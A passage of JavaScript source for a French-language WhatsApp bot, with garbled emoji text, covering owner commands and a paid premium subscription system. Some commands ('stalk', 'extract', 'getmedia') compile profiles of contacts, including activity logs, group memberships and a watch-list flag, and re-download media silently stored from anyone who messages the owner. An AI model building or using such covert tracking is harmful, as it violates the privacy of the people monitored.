                groups: [],
                isAdmin: false
              });
            }
            
            const person = peopleWhoKnowMe.get(num);
            person.groups.push(groupName);
            if (p.admin) person.isAdmin = true;
          }
        }
        
        // Trier par nombre de groupes en commun
        const sorted = [...peopleWhoKnowMe.entries()]
          .sort((a, b) => b[1].groups.length - a[1].groups.length);
        
        let text = `ðŸ‘ï¸ *QUI A TON NUMÃ‰RO?*\n`;
        text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
        text += `ðŸ“Š *${peopleWhoKnowMe.size} personnes* sont dans tes groupes\n`;
        text += `ðŸ˜ï¸ Elles peuvent avoir ton numÃ©ro!\n\n`;
        
        text += `ðŸ” *Top 20 (par groupes en commun):*\n\n`;
        
        sorted.slice(0, 20).forEach(([num, person], i) => {
          text += `${i + 1}. *${person.name}* ${person.isAdmin ? "ðŸ‘‘" : ""}\n`;
          text += `   ðŸ“± ${formatPhoneNumber(num)}\n`;
          text += `   ðŸ˜ï¸ ${person.groups.length} groupe(s) en commun\n\n`;
        });
        
        if (sorted.length > 20) {
          text += `... et ${sorted.length - 20} autres personnes\n\n`;
        }
        
        text += `ðŸ’¡ *Note:* Ces personnes peuvent voir ton numÃ©ro dans les groupes.`;
        
        return send(text);
        
      } catch (error) {
        console.error("[QUIAMON] Erreur:", error);
        return send(`âŒ Erreur: ${error.message}`);
      }
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ•µï¸ PROFIL STALKER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "stalk":
    case "stalker":
    case "profil":
    case "whois": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let targetNumber = args?.replace(/[^0-9]/g, "");
      if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
      if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
      
      if (!targetNumber) {
        return send(`ðŸ•µï¸ *PROFIL STALKER*\n\nUtilisation:\nâ€¢ \`.stalk @user\`\nâ€¢ \`.stalk 225XXXXXXXXXX\`\n\nObtiens toutes les infos d'un contact!`);
      }
      
      const targetJid = targetNumber + "@s.whatsapp.net";
      
      await send(`ðŸ” *RÃ©cupÃ©ration du profil de ${formatPhoneNumber(targetNumber)}...*`);
      
      try {
        let text = `ðŸ•µï¸ *PROFIL STALKER*\n`;
        text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
        text += `ðŸ“± *NumÃ©ro:* ${formatPhoneNumber(targetNumber)}\n`;
        
        // RÃ©cupÃ©rer le statut/bio
        try {
          const status = await hani.fetchStatus(targetJid);
          text += `ðŸ“ *Bio:* ${status?.status || "Pas de bio"}\n`;
          if (status?.setAt) {
            text += `ðŸ“… *Bio mise Ã  jour:* ${new Date(status.setAt * 1000).toLocaleString("fr-FR")}\n`;
          }
        } catch (e) {
          text += `ðŸ“ *Bio:* Non disponible\n`;
        }
        
        // VÃ©rifier prÃ©sence dans groupes
        const groups = await hani.groupFetchAllParticipating();
        let groupCount = 0;
        let groupNames = [];
        let isAdminSomewhere = false;
        
        for (const groupId of Object.keys(groups)) {
          const group = groups[groupId];
          const participant = group.participants?.find(p => 
            p.id?.split("@")[0]?.split(":")[0] === targetNumber
          );
          if (participant) {
            groupCount++;
            groupNames.push(group.subject || "Sans nom");
            if (participant.admin) isAdminSomewhere = true;
          }
        }
        
        text += `\nðŸ˜ï¸ *Groupes en commun:* ${groupCount}\n`;
        if (groupNames.length > 0) {
          groupNames.slice(0, 5).forEach((g, i) => {
            text += `   ${i + 1}. ${g}\n`;
          });
          if (groupNames.length > 5) text += `   ... et ${groupNames.length - 5} autres\n`;
        }
        
        text += `\nðŸ‘‘ *Admin quelque part:* ${isAdminSomewhere ? "Oui" : "Non"}\n`;
        
        // ActivitÃ© enregistrÃ©e
        const tracker = activityTracker.get(targetNumber);
        if (tracker) {
          text += `\nðŸ“Š *ActivitÃ© enregistrÃ©e:*\n`;
          text += `   ðŸ’¬ ${tracker.messageCount} messages\n`;
          text += `   ðŸ“… PremiÃ¨re vue: ${tracker.firstSeen}\n`;
          text += `   ðŸ• DerniÃ¨re vue: ${tracker.lastSeen}\n`;
        }
        
        // MÃ©dias stockÃ©s
        const medias = mediaStore.get(targetNumber);
        if (medias) {
          text += `\nðŸ“ *MÃ©dias reÃ§us:* ${medias.length}\n`;
        }
        
        // Sous surveillance?
        if (watchList.has(targetNumber)) {
          text += `\nðŸ”´ *Sous surveillance!*\n`;
        }
        
        // Banni?
        if (db.isBanned(targetJid)) {
          text += `\nðŸš« *BANNI du bot*\n`;
        }
        
        // RÃ©cupÃ©rer la photo de profil
        try {
          const ppUrl = await hani.profilePictureUrl(targetJid, "image");
          if (ppUrl) {
            const response = await fetch(ppUrl);
            const buffer = Buffer.from(await response.arrayBuffer());
            return hani.sendMessage(from, { 
              image: buffer, 
              caption: text 
            }, { quoted: msg });
          }
        } catch (e) {
          // Pas de photo de profil
        }
        
        return send(text);
        
      } catch (error) {
        console.error("[STALK] Erreur:", error);
        return send(`âŒ Erreur: ${error.message}`);
      }
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ“ EXTRACTION DE MÃ‰DIAS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "extract":
    case "extraire":
    case "medias": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let targetNumber = args?.replace(/[^0-9]/g, "");
      if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
      if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
      
      if (!targetNumber) {
        // Liste de tous les utilisateurs avec des mÃ©dias
        if (mediaStore.size === 0) return send("ðŸ“­ Aucun mÃ©dia stockÃ©.\n\nLes mÃ©dias sont automatiquement collectÃ©s quand quelqu'un t'envoie une image, vidÃ©o, audio ou document.");
        
        let list = "ðŸ“ *MÃ©dias disponibles par utilisateur*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n";
        let i = 1;
        for (const [num, medias] of mediaStore) {
          const firstMedia = medias[0];
          list += `${i}. ${formatPhoneNumber(num)}\n`;
          list += `   ðŸ‘¤ ${firstMedia?.pushName || "Inconnu"}\n`;
          list += `   ðŸ“Š ${medias.length} mÃ©dia(s)\n\n`;
          i++;
        }
        list += `\nðŸ’¡ Utilise \`.extract @user\` ou \`.extract [numÃ©ro]\` pour voir les dÃ©tails.`;
        return send(list);
      }
      
      const userMedias = mediaStore.get(targetNumber);
      if (!userMedias || userMedias.length === 0) {
        return send(`ðŸ“­ Aucun mÃ©dia stockÃ© pour ${formatPhoneNumber(targetNumber)}`);
      }
      
      let list = `ðŸ“ *MÃ©dias de ${formatPhoneNumber(targetNumber)}*\n`;
      list += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
      
      userMedias.forEach((media, index) => {
        list += `*${index + 1}.* ${media.type?.toUpperCase()}\n`;
        list += `   ðŸ“… ${media.date}\n`;
        if (media.caption) list += `   ðŸ’¬ "${media.caption.substring(0, 50)}..."\n`;
        if (media.fileName) list += `   ðŸ“„ ${media.fileName}\n`;
        list += "\n";
      });
      
      list += `\nðŸ’¡ Utilise \`.getmedia ${targetNumber} [nÂ°]\` pour tÃ©lÃ©charger.`;
      return send(list);
    }

    case "getmedia":
    case "dlmedia": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const parts = args?.split(" ") || [];
      let targetNumber = parts[0]?.replace(/[^0-9]/g, "");
      let mediaIndex = parseInt(parts[1]) - 1 || 0;
      
      if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
      if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
      
      if (!targetNumber) return send("âŒ Usage: .getmedia [numÃ©ro] [nÂ°]\nEx: .getmedia 2250150000000 1");
      
      const userMedias = mediaStore.get(targetNumber);
      if (!userMedias || userMedias.length === 0) {
        return send(`ðŸ“­ Aucun mÃ©dia pour ${formatPhoneNumber(targetNumber)}`);
      }
      
      if (mediaIndex < 0 || mediaIndex >= userMedias.length) {
        return send(`âŒ NumÃ©ro invalide. Ce contact a ${userMedias.length} mÃ©dia(s).`);
      }
      
      const media = userMedias[mediaIndex];
      
      try {
        const stream = await downloadMediaMessage(
          { message: media.message, key: media.key },
          "buffer",
          {},
          { logger: pino({ level: "silent" }), reuploadRequest: hani.updateMediaMessage }
        );
        
        const caption = `ðŸ“ *MÃ©dia extrait*\n\nðŸ‘¤ De: ${media.pushName}\nðŸ“± ${formatPhoneNumber(targetNumber)}\nðŸ“… ${media.date}\nðŸ“ Type: ${media.type}${media.caption ? "\n\nðŸ’¬ " + media.caption : ""}`;
        
        const botJid = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
        
        if (media.type === "image") {
          await hani.sendMessage(botJid, { image: stream, caption });
        } else if (media.type === "video") {
          await hani.sendMessage(botJid, { video: stream, caption });
        } else if (media.type === "audio") {
          await send(caption);
          await hani.sendMessage(botJid, { audio: stream, mimetype: "audio/mp4" });
        } else if (media.type === "document") {
          await hani.sendMessage(botJid, { 
            document: stream, 
            fileName: media.fileName || "document",
            caption 
          });
        }
        
        return;
      } catch (e) {
        return send(`âŒ Impossible de tÃ©lÃ©charger ce mÃ©dia: ${e.message}`);
      }
    }

    case "medialist":
    case "allmedia": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      if (mediaStore.size === 0) return send("ðŸ“­ Aucun mÃ©dia stockÃ©.");
      
      let total = 0;
      let byType = { image: 0, video: 0, audio: 0, document: 0 };
      
      for (const [num, medias] of mediaStore) {
        total += medias.length;
        medias.forEach(m => {
          if (byType[m.type] !== undefined) byType[m.type]++;
        });
      }
      
      let text = `ðŸ“ *Statistiques mÃ©dias*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
      text += `ðŸ‘¥ Utilisateurs: ${mediaStore.size}\n`;
      text += `ðŸ“Š Total mÃ©dias: ${total}\n\n`;
      text += `ðŸ“¸ Images: ${byType.image}\n`;
      text += `ðŸŽ¥ VidÃ©os: ${byType.video}\n`;
      text += `ðŸŽµ Audios: ${byType.audio}\n`;
      text += `ðŸ“„ Documents: ${byType.document}\n`;
      text += `\nðŸ’¡ Utilise \`.extract\` pour voir par utilisateur.`;
      
      return send(text);
    }

    case "clearmedia": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let targetNumber = args?.replace(/[^0-9]/g, "");
      if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
      
      if (targetNumber) {
        mediaStore.delete(targetNumber);
        return send(`âœ… MÃ©dias supprimÃ©s pour ${formatPhoneNumber(targetNumber)}`);
      } else {
        mediaStore.clear();
        return send("âœ… Tous les mÃ©dias stockÃ©s ont Ã©tÃ© supprimÃ©s.");
      }
    }

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // ðŸ’Ž COMMANDES PREMIUM - SYSTÃˆME D'ABONNEMENT
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    case "premium":
    case "myplan": {
      const info = premiumDB.getPremiumInfo(sender);
      const planEmojis = { FREE: "ðŸ†“", BRONZE: "ðŸ¥‰", ARGENT: "ðŸ¥ˆ", OR: "ðŸ¥‡", DIAMANT: "ðŸ’Ž", LIFETIME: "ðŸ‘‘" };
      const emoji = planEmojis[info.plan] || "ðŸ“‹";
      
      let text = `${emoji} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      text += `   *VOTRE ABONNEMENT PREMIUM*\n`;
      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      text += `ðŸ‘¤ *Utilisateur:* ${senderName || "Inconnu"}\n`;
      text += `ðŸ“± *NumÃ©ro:* +${sender.split("@")[0]}\n`;
      text += `${emoji} *Plan actuel:* ${info.plan}\n`;
      
      if (info.plan === "FREE") {
        text += `\nðŸ“Š *Limites:*\n`;
        text += `   â€¢ ${info.dailyCommands}/${info.dailyLimit} commandes/jour\n`;
        text += `   â€¢ FonctionnalitÃ©s de base uniquement\n`;
        text += `\nðŸ’¡ *Passez Ã  Premium pour:*\n`;
        text += `   â€¢ Plus de commandes par jour\n`;
        text += `   â€¢ AccÃ¨s aux fonctionnalitÃ©s exclusives\n`;
        text += `   â€¢ Support prioritaire\n`;
        text += `\nðŸ“‹ Tapez \`.plans\` pour voir les offres`;
      } else if (info.plan === "LIFETIME") {
        text += `\nâ­ *ACCÃˆS ILLIMITÃ‰ Ã€ VIE*\n`;
        text += `   â€¢ Toutes les fonctionnalitÃ©s\n`;
        text += `   â€¢ Aucune limite de commandes\n`;
        text += `   â€¢ Support VIP prioritaire\n`;
        text += `\nðŸ™ Merci pour votre confiance!`;
      } else {
        text += `\nðŸ“Š *Statistiques:*\n`;
        text += `   â€¢ Commandes aujourd'hui: ${info.dailyCommands}/${info.dailyLimit === Infinity ? "âˆž" : info.dailyLimit}\n`;
        text += `   â€¢ Expire le: ${new Date(info.expiresAt).toLocaleDateString("fr-FR")}\n`;
        const daysLeft = Math.ceil((new Date(info.expiresAt) - new Date()) / (1000 * 60 * 60 * 24));
        text += `   â€¢ Jours restants: ${daysLeft}\n`;
        text += `\nâœ¨ *Avantages actifs:*\n`;
        text += `   â€¢ Commandes illimitÃ©es ou augmentÃ©es\n`;
        text += `   â€¢ FonctionnalitÃ©s premium dÃ©bloquÃ©es\n`;
        if (daysLeft <= 7) {
          text += `\nâš ï¸ *Votre abonnement expire bientÃ´t!*\n`;
          text += `Renouvelez avec \`.upgrade ${info.plan.toLowerCase()}\``;
        }
      }
      
      return send(text);
    }

    case "plans":
    case "tarifs":
    case "offres": {
      let text = `ðŸ’Ž â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      text += `   *PLANS PREMIUM DISPONIBLES*\n`;
      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      
      text += `ðŸ†“ *FREE* (Gratuit)\n`;
      text += `   â€¢ 20 commandes/jour\n`;
      text += `   â€¢ FonctionnalitÃ©s de base\n\n`;
      
      text += `ðŸ¥‰ *BRONZE* - 500 FCFA/mois\n`;
      text += `   â€¢ 100 commandes/jour\n`;
      text += `   â€¢ Support standard\n\n`;
      
      text += `ðŸ¥ˆ *ARGENT* - 1 000 FCFA/mois\n`;
      text += `   â€¢ 300 commandes/jour\n`;
      text += `   â€¢ AccÃ¨s fonctions avancÃ©es\n\n`;
      
      text += `ðŸ¥‡ *OR* - 2 000 FCFA/mois\n`;
      text += `   â€¢ Commandes illimitÃ©es\n`;
      text += `   â€¢ Toutes les fonctionnalitÃ©s\n`;
      text += `   â€¢ Support prioritaire\n\n`;
      
      text += `ðŸ’Ž *DIAMANT* - 5 000 FCFA/mois\n`;
      text += `   â€¢ Tout OR +\n`;
      text += `   â€¢ FonctionnalitÃ©s exclusives\n`;
      text += `   â€¢ Support VIP 24/7\n\n`;
      
      text += `ðŸ‘‘ *LIFETIME* - 15 000 FCFA (unique)\n`;
      text += `   â€¢ AccÃ¨s Ã  vie illimitÃ©\n`;
      text += `   â€¢ Toutes les fonctionnalitÃ©s\n`;
      text += `   â€¢ Support VIP prioritaire\n\n`;
      
      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      text += `ðŸ“² *Contact:* +22550252467\n`;
      text += `ðŸ’° *Paiement:* Wave, Orange Money, MTN\n`;
      text += `\nðŸ’¡ Pour s'abonner: \`.upgrade <plan>\``;
      
      return send(text);
    }

    case "upgrade":
    case "subscribe":
    case "acheter": {
      const plan = args?.toUpperCase();
      const validPlans = ["BRONZE", "ARGENT", "OR", "DIAMANT", "LIFETIME"];
      
      if (!plan || !validPlans.includes(plan)) {
        let text = `ðŸ“‹ *Usage:* .upgrade <plan>\n\n`;
        text += `*Plans disponibles:*\n`;
        text += `â€¢ bronze - 500 FCFA/mois\n`;
        text += `â€¢ argent - 1 000 FCFA/mois\n`;
        text += `â€¢ or - 2 000 FCFA/mois\n`;
        text += `â€¢ diamant - 5 000 FCFA/mois\n`;
        text += `â€¢ lifetime - 15 000 FCFA (unique)\n\n`;
        text += `ðŸ’¡ Exemple: \`.upgrade or\``;
        return send(text);
      }
      
      const prices = { BRONZE: 500, ARGENT: 1000, OR: 2000, DIAMANT: 5000, LIFETIME: 15000 };
      const price = prices[plan];
      const planEmojis = { BRONZE: "ðŸ¥‰", ARGENT: "ðŸ¥ˆ", OR: "ðŸ¥‡", DIAMANT: "ðŸ’Ž", LIFETIME: "ðŸ‘‘" };
      
      let text = `${planEmojis[plan]} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      text += `   *DEMANDE D'ABONNEMENT*\n`;
      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      text += `ðŸ“¦ *Plan choisi:* ${plan}\n`;
      text += `ðŸ’° *Prix:* ${price.toLocaleString()} FCFA${plan === "LIFETIME" ? " (paiement unique)" : "/mois"}\n\n`;
      text += `ðŸ“² *Pour finaliser votre achat:*\n\n`;
      text += `1ï¸âƒ£ Envoyez ${price} FCFA via:\n`;
      text += `   â€¢ Wave: +22550252467\n`;
      text += `   â€¢ Orange Money: +22550252467\n`;
      text += `   â€¢ MTN Money: +22550252467\n\n`;
      text += `2ï¸âƒ£ Envoyez une capture du paiement\n`;
      text += `   Ã  ce numÃ©ro WhatsApp\n\n`;
      text += `3ï¸âƒ£ Recevez votre code d'activation\n\n`;
      text += `â±ï¸ Activation en moins de 5 minutes!\n\n`;
      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      text += `ðŸ“ž *Contact:* wa.me/22550252467`;
      
      return send(text);
    }

    case "redeem":
    case "activer":
    case "code": {
      if (!args) {
        return send(`ðŸ“‹ *Usage:* .redeem <code>\n\nðŸ’¡ Exemple: \`.redeem ABC123XYZ\`\n\nVous recevrez votre code aprÃ¨s paiement.`);
      }
      
      const result = premiumDB.redeemCode(args.trim().toUpperCase(), sender);
      
      if (result.success) {
        const planEmojis = { BRONZE: "ðŸ¥‰", ARGENT: "ðŸ¥ˆ", OR: "ðŸ¥‡", DIAMANT: "ðŸ’Ž", LIFETIME: "ðŸ‘‘" };
        let text = `âœ… â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
        text += `   *CODE ACTIVÃ‰ AVEC SUCCÃˆS!*\n`;
        text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
        text += `${planEmojis[result.plan]} *Plan:* ${result.plan}\n`;
        if (result.plan === "LIFETIME") {
          text += `â­ *DurÃ©e:* Ã€ VIE!\n`;
        } else {
          text += `ðŸ“… *DurÃ©e:* ${result.duration} jours\n`;
          text += `ðŸ—“ï¸ *Expire le:* ${new Date(result.expiresAt).toLocaleDateString("fr-FR")}\n`;
        }
        text += `\nðŸŽ‰ Profitez de vos avantages premium!\n`;
        text += `ðŸ“‹ Tapez \`.premium\` pour voir votre plan`;
        return send(text);
      } else {
        return send(`âŒ *Erreur:* ${result.message}\n\nðŸ’¡ VÃ©rifiez que le code est correct et n'a pas dÃ©jÃ  Ã©tÃ© utilisÃ©.`);
      }
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ COMMANDES OWNER PREMIUM â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    case "gencode": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const plan = args?.toUpperCase();
      const validPlans = ["BRONZE", "ARGENT", "OR", "DIAMANT", "LIFETIME"];
      
      if (!plan || !validPlans.includes(plan)) {
        return send(`ðŸ“‹ *Usage:* .gencode <plan>\n\n*Plans:* bronze, argent, or, diamant, lifetime\n\nðŸ’¡ Exemple: \`.gencode or\``);
      }
      
      const result = premiumDB.generateCode(plan);
      
      if (result.success) {
        let text = `âœ… *Code gÃ©nÃ©rÃ© avec succÃ¨s!*\n\n`;
        text += `ðŸ“¦ *Plan:* ${plan}\n`;
        text += `ðŸ”‘ *Code:* \`${result.code}\`\n`;
        text += `ðŸ“… *DurÃ©e:* ${result.duration === "LIFETIME" ? "Ã€ vie" : result.duration + " jours"}\n\n`;
        text += `ðŸ’¡ Envoyez ce code au client pour activation`;
        return send(text);
      } else {
        return send(`âŒ Erreur: ${result.message}`);
      }
    }

    case "gencodes": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const parts = args?.split(/\s+/);
      if (!parts || parts.length < 2) {
        return send(`ðŸ“‹ *Usage:* .gencodes <plan> <nombre>\n\nðŸ’¡ Exemple: \`.gencodes or 5\``);
      }
      
      const plan = parts[0].toUpperCase();
      const count = parseInt(parts[1]) || 1;
      const validPlans = ["BRONZE", "ARGENT", "OR", "DIAMANT", "LIFETIME"];
      
      if (!validPlans.includes(plan)) {
        return send(`âŒ Plan invalide. Plans disponibles: bronze, argent, or, diamant, lifetime`);
      }
      
      if (count < 1 || count > 20) {
        return send(`âŒ Nombre invalide. Entre 1 et 20 codes maximum.`);
      }
      
      let text = `âœ… *${count} codes ${plan} gÃ©nÃ©rÃ©s:*\n\n`;
      for (let i = 0; i < count; i++) {
        const result = premiumDB.generateCode(plan);
        if (result.success) {
          text += `${i + 1}. \`${result.code}\`\n`;
        }
      }
      text += `\nðŸ’¡ Chaque code est Ã  usage unique.`;
      return send(text);
    }

    case "listcodes":
    case "codes": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const codes = premiumDB.getUnusedCodes();
      
      if (codes.length === 0) {
        return send(`ðŸ“‹ *Aucun code disponible*\n\nðŸ’¡ GÃ©nÃ©rez des codes avec \`.gencode <plan>\``);
      }
      
      let text = `ðŸ”‘ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      text += `   *CODES NON UTILISÃ‰S*\n`;
      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      
      const byPlan = {};
      for (const c of codes) {
        if (!byPlan[c.plan]) byPlan[c.plan] = [];
        byPlan[c.plan].push(c.code);
      }
      
      for (const [plan, planCodes] of Object.entries(byPlan)) {
        const planEmojis = { BRONZE: "ðŸ¥‰", ARGENT: "ðŸ¥ˆ", OR: "ðŸ¥‡", DIAMANT: "ðŸ’Ž", LIFETIME: "ðŸ‘‘" };
        text += `${planEmojis[plan] || "ðŸ“¦"} *${plan}* (${planCodes.length}):\n`;
        planCodes.forEach((code, i) => {
          text += `   ${i + 1}. \`${code}\`\n`;
        });
        text += `\n`;
      }
      
      text += `ðŸ“Š *Total:* ${codes.length} codes disponibles`;
      return send(text);
    }

    case "addpremium": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const parts = args?.split(/\s+/);
      let targetJid = mentioned[0];
      let plan = parts?.[0]?.toUpperCase();
      let days = parseInt(parts?.[1]) || 30;
      
      if (mentioned[0]) {
        plan = parts?.[0]?.toUpperCase();
        days = parseInt(parts?.[1]) || 30;
      } else if (parts && parts.length >= 1) {
        const num = parts[0].replace(/[^0-9]/g, "");
        if (num.length >= 8) {
          targetJid = num + "@s.whatsapp.net";
          plan = parts[1]?.toUpperCase();
          days = parseInt(parts[2]) || 30;
        }
      }
      
      if (!targetJid || !plan) {
        return send(`ðŸ“‹ *Usage:* .addpremium @user <plan> [jours]\n\nðŸ’¡ Exemple: \`.addpremium @user or 30\``);
      }
      
      const validPlans = ["BRONZE", "ARGENT", "OR", "DIAMANT", "LIFETIME"];
      if (!validPlans.includes(plan)) {
        return send(`âŒ Plan invalide. Plans: bronze, argent, or, diamant, lifetime`);
      }
      
      const result = premiumDB.addPremium(targetJid, plan, days);
      
      if (result.success) {
        const planEmojis = { BRONZE: "ðŸ¥‰", ARGENT: "ðŸ¥ˆ", OR: "ðŸ¥‡", DIAMANT: "ðŸ’Ž", LIFETIME: "ðŸ‘‘" };
        return send(`âœ… ${planEmojis[plan]} Premium ${plan} ajoutÃ© pour +${targetJid.split("@")[0]}\nðŸ“… DurÃ©e: ${plan === "LIFETIME" ? "Ã€ vie" : days + " jours"}`);
      } else {
        return send(`âŒ Erreur: ${result.message}`);
      }
    }

    case "delpremium":
    case "removepremium": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let targetJid = mentioned[0];
      if (!targetJid && args) {
        const num = args.replace(/[^0-9]/g, "");
        if (num.length >= 8) targetJid = num + "@s.whatsapp.net";
      }
      
      if (!targetJid) {
        return send(`ðŸ“‹ *Usage:* .delpremium @user\n\nðŸ’¡ Exemple: \`.delpremium @user\``);
      }
      
      const result = premiumDB.removePremium(targetJid);
      
      if (result.success) {
        return send(`âœ… Premium supprimÃ© pour +${targetJid.split("@")[0]}`);
      } else {
        return send(`âŒ ${result.message}`);
      }
    }

    case "premiumlist":
    case "listpremium": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const users = premiumDB.getAllPremiumUsers();
      
      if (users.length === 0) {
        return send(`ðŸ“‹ *Aucun utilisateur premium*\n\nðŸ’¡ Ajoutez avec \`.addpremium @user <plan>\``);
      }
      
      let text = `ðŸ‘‘ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      text += `   *UTILISATEURS PREMIUM*\n`;
      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      
      const planEmojis = { BRONZE: "ðŸ¥‰", ARGENT: "ðŸ¥ˆ", OR: "ðŸ¥‡", DIAMANT: "ðŸ’Ž", LIFETIME: "ðŸ‘‘" };
      
      users.forEach((u, i) => {
        const num = u.jid.split("@")[0];
        text += `${i + 1}. ${planEmojis[u.plan] || "ðŸ“¦"} +${num}\n`;
        text += `   Plan: ${u.plan}`;
        if (u.plan !== "LIFETIME" && u.expiresAt) {
          const daysLeft = Math.ceil((new Date(u.expiresAt) - new Date()) / (1000 * 60 * 60 * 24));
          text += ` | ${daysLeft}j restants`;
        }
        text += `\n\n`;
      });
      
      text += `ðŸ“Š *Total:* ${users.length} utilisateurs premium`;
      return send(text);
    }

    case "premiumstats": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const stats = premiumDB.getStats();
      
      let text = `ðŸ“Š â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      text += `   *STATISTIQUES PREMIUM*\n`;
      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      
      text += `ðŸ‘¥ *Utilisateurs:*\n`;
      text += `   â€¢ Total premium: ${stats.totalPremium}\n`;
      text += `   â€¢ Lifetime: ${stats.byPlan?.LIFETIME || 0}\n`;
      text += `   â€¢ Diamant: ${stats.byPlan?.DIAMANT || 0}\n`;
      text += `   â€¢ Or: ${stats.byPlan?.OR || 0}\n`;
      text += `   â€¢ Argent: ${stats.byPlan?.ARGENT || 0}\n`;
      text += `   â€¢ Bronze: ${stats.byPlan?.BRONZE || 0}\n\n`;
      
      text += `ðŸ”‘ *Codes:*\n`;
      text += `   â€¢ GÃ©nÃ©rÃ©s: ${stats.totalCodes || 0}\n`;
      text += `   â€¢ UtilisÃ©s: ${stats.usedCodes || 0}\n`;
      text += `   â€¢ Disponibles: ${stats.unusedCodes || 0}\n\n`;
      
      const revenue = (stats.byPlan?.BRONZE || 0) * 500 +
                      (stats.byPlan?.ARGENT || 0) * 1000 +
                      (stats.byPlan?.OR || 0) * 2000 +
                      (stats.byPlan?.DIAMANT || 0) * 5000 +
                      (stats.byPlan?.LIFETIME || 0) * 15000;
      
      text += `ðŸ’° *Revenus estimÃ©s:* ${revenue.toLocaleString()} FCFA`;
      
      return send(text);
    }

    case "premiumhelp": {
      let text = `ðŸ’Ž â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      text += `   *AIDE PREMIUM*\n`;
      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      
      text += `ðŸ“‹ *Commandes utilisateur:*\n`;
      text += `â€¢ \`.premium\` - Voir son plan\n`;
      text += `â€¢ \`.plans\` - Voir les offres\n`;
      text += `â€¢ \`.upgrade <plan>\` - S'abonner\n`;
      text += `â€¢ \`.redeem <code>\` - Activer un code\n\n`;
      
      if (isOwner) {
        text += `ðŸ‘‘ *Commandes owner:*\n`;
        text += `â€¢ \`.gencode <plan>\` - GÃ©nÃ©rer 1 code\n`;
